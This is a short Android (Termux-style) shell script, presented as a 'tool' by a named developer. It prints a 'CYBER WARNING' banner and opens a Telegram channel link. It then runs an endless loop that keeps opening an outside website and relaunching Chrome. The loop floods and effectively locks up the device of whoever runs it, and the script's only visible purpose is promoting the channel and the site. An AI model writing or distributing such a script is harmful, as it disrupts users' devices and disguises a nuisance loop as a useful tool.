

clear

echo "       𝐉𝐨𝐢𝐧 𝐭𝐞𝐥𝐞𝐠𝐫𝐚𝐦 𝐜𝐡𝐚𝐧𝐧𝐞𝐥  " 

echo ""

echo " https://telegram.me/ANONYMOUSKINGCHANNEL" 

echo " "

echo "          ☠️ 🄲🅈🄱🄴🅁 🅆🄰🅁🄽🄸🄽🄶 ⚠️ "

echo " "

echo " this tool developer : KARTHICK "

sleep 2 

xdg-open https://telegram.me/ANONYMOUSKINGCHANNEL

while :

do

xdg-open https://jockerrk.w3spaces.com/

am start --user 0 -n com.android.chrome/com.google.android.apps.chrome.Main

done 
